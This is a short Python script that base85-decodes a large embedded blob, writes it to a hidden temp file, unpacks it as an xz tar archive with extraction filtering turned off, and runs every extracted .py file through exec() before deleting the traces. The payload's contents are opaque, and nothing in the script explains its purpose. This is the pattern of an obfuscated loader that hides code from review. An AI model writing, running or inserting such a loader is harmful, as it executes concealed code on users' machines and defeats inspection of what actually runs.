
import tarfile, os, shutil, tempfile, sys, platform, warnings
from base64 import b85decode

source = b85decode(b'{Wp48S^xk9=GL@E0stWa761SMbT8$j;7|V&d0hY(3)}>NP%<X&9eo?~^2;;q?D#kE>ehQX!Mqz*A9Ze?8Q1ZZV%6KNTg7dy6ox{XAnE{AW)?GyQ|3krZK6UVVpsy@@cjyk9u<=<(hTCnMoFl7bdyst9xe%%V(ulhk4i))Vt0(#0@PCu;om{l=e;I!mtRV!t`V`L(T9{JeIviH&u?c05rc_><<r8OCtWa36e+zFsUzmFR~+q{!Nwa6d^<60geh?>aHP@!K2{1H{C35u5=WkF%u~blzROt{f5YXtL%+@%fW4>R2NQ|<&xwmc+(+VzD9+AYpz!iLP!3<Nm{qLjzu9W#8aLdG40WLIOlFTIl`?2>#5efThW~283O;~{?jwc+0)<iQ<Sg<W4mr|x$uhlN**__x3}NBS)Te+}l!C9viHju{^iF>->csOnS=+BXY{&=%+hRxw!Pm)CJ<&&Un>$aWI?Hdkv#Xr&u^+9+2Dbrk0~>f91BN;&M=!)c36buLo{o&e6W=(Al6_S77KH!LJpLf#*aAeHw;@DN^`?ApKm!9moM<=BW_!n|0Kwwz>k9ytvGg2#L{8U5C(Ouwi-tSUh}a1%`ya4^;|4%E$_ple1Z=Hq9SHO^KS;G)Cdh*5j_IUz;k>PvmFVFG%<xc(X9>q5;fQ5TaH2pqkt=IwzHLGCAKthHrip0+;>eeA@q3Se>-ALVH_-ir(3v&^T28p?<m|q9BnCgXMuI!c7ulYAGaPCWrNe@Mj*C1`5o_-<Q1a4Ukg@KP>m~;n*XPlb*lh7B@CbT6Roo<z0n68=K|Pt!(nwLaTa4DPLY2oEbd8$!7LATNO&+v*amm6^-ksIbEUhEee=BQ3=gix2aD2-~SBZgyK-uYzs)Sqlhc5))1H{=Mmz+dB5mN<N@Sp19h7*uS|4oGQ!goh8XmeZPa9m6p0B;%hV)7IjIUZQ13}WHm@~?w>z}2k>EUC_HXjSVa3OJoNnk`BvMdyMTF8+x09{-n)zIuEl)lNztf}fyV-vxk>F6O=W!w;ItLoaoAqIad27WJ2GM`a+NPFsAhc(pEtd#Zbf_8xBMNfPf;YP8|81Df>Q8wo(Qs`ekaf%Pq@3v0xhHmJJBqjcHL6zyg3hb6c1Nk5Ar<mF6}r@aNG4Yn?C*DzO*a;u3Qdzc`qMicR%afFurjHIE)|NqPcd!duT^=Fi6;IFSv$7swYO--XoD~$+=h1$)=EY{dpmZ*^h$quKVYs%3*fEJub*~S`hQT)5y==OLkRk`><2@DvxrLOchgX1zSX-Ud5cGl2`zlAcW=rnBGn$N?1k2wUH;mNFP9qChNb0Z(<Aw{sB=|=-g%~(>To8Z7GfhtS-&Ny;^L$A1mCe}B=yqk1IYp5#|474Oo=thx+DvcZ@^ej!Gi_dnrryhQ{hu-J-jvkJXz3uUd#!0GucH=|u;g|hv3U{<m{BRK=O?yI@LPGG!l&t5}u5r5ynL7HXKj;q7hji_^0*gm6f&`IX_jzP(Dl45`urOM6YIhKag~=yFcvF|R-Jrg+JXzuT)?e9HWL;;E&N!W-ws%u?+ZGSKB_@EQ>4^(O9SPPKDU9Ck{GT0@rZzle`dNw|dA+L}8-8M;Il+K;6Y&8mnAtAXgt8&#BN-AQT{9e9NrLuGSTdDDv_)VQOzRXsfc-K?Q^3~0-HF<qw4heB>39dP^Z<3;G}L^1hwhB#t&;EH)7Z3ZG-w&(s=ACThlJk11wS-+3v_Vyr(wJ;bl!k9_k(Oj<pM^lYG+FV#smTUX{0=4O;=A<9tD`u1hxvU_$w&IYo^dBpZ!@hEaV`VaUP&?72hzrT}f3CyHf@AKN41raRzN4jhq(TLaVr{)SJyfgvCvq5gJL5Tf4PJ`Naoax;DA4eVL4;M=ZG<oiV1xC>`X*J$=SvK`?<8sFKfd@f&UK&E6(Wy{^8AN9YXr>*Smv5#Z^U3Pmh^jfOz?j8t&c^*APXq#eW6IATXX$Ov9#zA4nnXtIHl4bf;yB!ncQF6(1^K2h18jwh^je8-MxssQd{Xb?1HvpHO`z5ZPP72X1qlFHt(bm4JF%qkNds3lz-GLHI_aX-zAh{uUT^2YFl8*%kOKwf9;69XC@(U+Y=e>dk_TUtMG@lG?LOZEi5e-YWwFBEQZaXNJed+H;+jJ-p;cpQ=e@<3QF7{zuX-|blj-ol~E>)|*%Yww{jh3GD$<v1Sr>$`Wz)RK^<tRfFr0e88^P1wY?03L0;%syTOFSu0PYQ7*jIR!VGGD&QUB}F`T7Z%shyu`t`$+P~?n9}<CMACFXJB8`Vn;v6WCa#OOz2kSUUp7%{gkMb_TRLp)KIF37Dd=lwNcwj%S^E%NKBLfs(I0>#7P5GdvVrNmY`GmW3bW<>Rk2#OfUJ0Z2~w7jd|BI(cRR>@s_^<wwdeCj7`CW;-I?8c^d>-&UY?~2es!2+LJ~jzdpCQo<h-fG$#dUD`9+{%^nsh6`>UM(;ah9e>J*dmWcCB`X@$kRL2o?wJ)@gKW(HR5&cIog&s$`v5G1x_2a>>wt6!N>CI!7O(JhIwN9Cnse)nM=8&8JAT0kh#+P4F=HzoOvW@XF!p^LqrZr%%sLq3Hp3{X^cq0CwByUuucn4goS%MkHqyypBaK6dQkZ*Upq=T;$5OTs9dgmjCdLlpOAXq$q<Q`)*9@mOZn2AE4SqG{VsEZ2k6?5qi4lWy%&syVb>@w(!S0mX1w=~o!e=ERi`=tbX`yqj(Kzzk*enp6dO&Dn7<z{ZsaWUVwtZ*+F(S|1pS*IC{2WVK>JsqS3TG#Z!rKY@A|@!kr^6#B?@8*lxa@>$JVnGMlF5~a5@!;W1*jTzHXvc%PZC(AHjnB<J_IPak+(~rJ#A~|!k=IPS8O%tsDYERoKYz`sax=}gQ)Ki~zl97O)3B92`dsyzduM5pr6c%ANO*pW~#gxA;(Q?yA!^d2TmG_eR<g!E3?CRjrXRf3<0c*_s?4=FYo0L=5ME)b!ASP;K`UFA*O8`!8aG)VLtPN#bs67X;R<Z22moz0Yt1w%#0W$h^4wu*KA#*z8*lON>lAJXt5G~jhU9zu`KSReWJ>K*H=$-5B>xiwsskX4#M4+rA@w7Ajx!y@)VU(gr=|F$MsqL6LZ)_iVj*OLmkXk#RX9{eMITODgc9n_WjbkN7q<>(#RVa6%4Hr@?fO~|Vs!Lj$Vm!(*+spVy^?YfKYDHJH8Nwd`QHAD)j+tU@vhXt8hPFLEW}L`Y<`HDRjKf$Za{$DsNM8VPVNQpzw4NsfH6}v>B?7$);(&ItldiJpk<C3dt8)hk$x<T43WA<oHZ-2IbXb>#k*3~RxaB6)4&P>OPD6o{jb*-|R81j@TVd)?t;m5BT3n(mK0_|SOW9m1pttUPNaS7)Cn)DsR)}mL4qm9gRa2BCrWrX4mGN_F?<Fp|Ulq64uzzZNm5DF3XmB|?ch#Yxx}(Npa2b-BQ8CCEDADSi&kH76L&o^b^GBXqX+m^*Hkaw#>S#jNECg|FlWBw=Qjk+y$W1Y`GLIQ|Sq<}md*$PoG7aYwEaiz=h7Gz6ChLEF&?Bs63NMF$+oftSd-;cX-o~B|Gx3O@`u(ffPc#uBE7`Z}!@rxu|6I{VJ43Uf0z&Dx8iq*!h7e8_#ySk<!qLlrx$Yw|b%&x0$LUo0_)hG7#i4yo%ufhaOgcncjXEU7Y&DbAGnq_HFo|(xQRoJN9ZZ_RBp-nW)Wow6LMBQhLgu63v1=wJ^Ha1kRSQsX=#vRSpt*D{F5d5QxYJ;`Fb7Yk-fy+TPQ{Wfu<4_ZdR%$BfSbK7n4gv3`P#~^#=wb=J&SbE9L|Pl*i0-vi<<Zwi!95z?*3bWlLw%NJ=uKHbsg|acDxpPRS;U=mh`_gFzH78-iQxkOcFXb`Pv-7!%g9~g<66!=_*Ybwo?--$3g3#2(nh%P>@clwBx7r(RnofqBJ1WMt!@BO%5DZ+wR$ID@o1nY?!bz5@yhAgy1*0GbhQ0T5LB2zh%@HYv#I*n9f_eN|W88%x=kkBZJW&_7%$XZxWcDhM>}#!~tTI8*hX><`88H;%PQ?pA1bO`D#fW=v2fWUpj}Xs6=wky-VQK8fZ7Bk8hFdY$#%j^D1>?DrJOFDaw_<4(GG4K<~6jAkf{zpyiLZQ2yFGsS|AA*E^tDwY=MAR8iCazCIPY55;a0t1>TT#!$v_n`#LbV`{Ni>`r(!SZ`;Yk$dxBYGheEco_;d5Oru(TJzVXv!BaR_gw9l1TAG!{Y0Okrf^MZ6V}83)CsUNb%(Jp7ao+{cen%I{r)nx-Q&{=$GT{W+8-q>1fE6GQ%YDC%JAQbPn&gXby_~RBFt84oe$|ScM-DYjK_SSq?8npy164M+-5$0{Uh_Go#kcO{vlG}y7?>f80Fe40{Cmn81H9{i*#yVb~te3rAysQ?*CVA5?G!YY}!{radNdPX>JPY<V;dn1Mpi?Z))gcSu(M0ad7aCdA5!YTZ8r-*rWttsaS@^TDtTqL5cNP3!yHQ%HOZ<Gg4k+-{_1Sm@Gdv1V~qe=9`k+K;V)+D3^1dQHM!o%#1V-^EjMcjKpZFz^n!^x_j?l+fil(oFHT(1B5y&yBHKBxJ=SutJmZY$+Ktpk@H4)_HbQ&<jGt6hF)4UpGWvqHZWazx&p6EM8=9$(F33vP1%R_ZFh{W?<7!nppLA0pA&)m7JZGYl#%o>ynl1c>{?$waK>^97;SEK)VQFO`q<mmv=yWrp4BJ3!zn`0!iWRc1+q*7Z5c)3Luuo^;dpO~9ovVE@liVl1;YNd9bWGLPp{T+6n!0ErxEZO5>+3l$MHX~TbwNkZAfx0nLSr+cQyg6ZHRk<-lJ)jv#X!crk*vPTOhm~1~f(DgGy?^52GgpRG-)1dF})C%axUNYP^P;#-QmR%M(z0+ZyyO?&^8horqoX)nBTorO<4EAB4i=L3*e4B~>p?!YQK8Gn8V*7@dyyCSF>6v-j}&WcF$*$bp+HaFy?ubTvrv-r&LE^+AJ7qhW&kTWy#322KQ(?D6()0#~i8e$&YC0*vx(f9J&XF;ZweUq!Lb`=Pz5pm+B3$%Fi%y{#Ua)Z45bL0U)C%7x(GAL}^)cIE`OT*k*_3<uN_AbzMR?1x)$=`Erh0lxnP@f1xL@@O}9@^O(pViSq=ny*B|zx3By8Qj!bp|Wm874Y$%B+d;{ckh&G93Y`_pis)lGgt&(wiv>Q_-32lYlrX%T6LFc70@5LUzVj{<H;zshJ^{UYC@8HTUJIQ{w*0mIJ7D;3F9exz;~vB0sk`2+I+TIBZ*(Iltk9%p!4`F_d~+TM_`FchFOU&o&^9q45IJ#vM7ZUNKx`l4iDinbY=T<l+Zn^wl9{ZGZb25oA>X{f1G}1`dcMx+c8bN;#6%}MB07@!q4pP=lU(Qb+c*gW73Y~XHt|!S}J&H8&oM~hHy?a<^llSc@<i7A2BryHdrahU4rDXQd|p58V(lSN>*}<3ld0BfD@N9qvcIu;{jGiVp1bYM*OXdEAp0rcU1QJo6*~`FUED6emJAKoKu)WQD!s3IiT%JwVpO>&4zl>>5f^qbqugoZ}8TT<~6@6zh6?3NvG?!gif>HIkIlM7)L0xs7cLE;)zlCNQ9q!w6*|C-o4t%I_qG1RduzK7}#ykT2>o!Hs3W02AHWgj!#Rj@*<;}v^KMVervH}tIw`bdK%7L&ApbO%ld^1jyB0RMxD2Bm3h$}_~#!wI4}4%2B}KeLmh7ydl3_WXY9A?RaMB^tFY&=E4#gy$YXOcC?FXhV=c6p;n7IL_!*XC`9-eZUfGLbl|?NDW8Zb0O9E8lPoHY~Y$EinA}d-TMPC_a>_8<554{`!8yt|VB@^%nkqR^=9FbYNC^1Lo!Ew_B8H_EAu``yOf}JjAO-ZR|{-+Ikf=?~N+(w!@f|a~Gd|t(LHn`J<IvVjtwya(!?#wgT3uXT6M6^Rdh+|GvE^x#E$L^k{G<nHSE9g*FY&shOn=zTgGE6b(qp=r4L3B6z&==Mcw*RWrA39Z?>qDaXL7_Poxyv_M=cnma*Kox(`Z_wN1?6q{g~Mth>)`Ex{ovDzR^$3JbrY+R^OfPz00000hV<X%M;&+B00EUHfS>^YLn-B|vBYQl0ssI200dcD')
file_name = '.encrypted'

warnings.filterwarnings('ignore', category=DeprecationWarning)

def main():
    try:
        C = tempfile.mkdtemp()
        H = os.path.join(C, file_name)
        with open(H, 'wb') as M:
            M.write(source)
        with tarfile.open(H, 'r:xz') as N:
            N.extractall(C, filter=None)
        for root, _, files in os.walk(C):
            for file in files:
                if file.endswith(".py"):
                    exec(open(os.path.join(root, file)).read())
    except Exception as e:
        print('⚠️ Error:', e)
    finally:
        if os.path.exists(file_name):
            os.remove(file_name)
        shutil.rmtree(C)

if __name__ == '__main__':
    main()
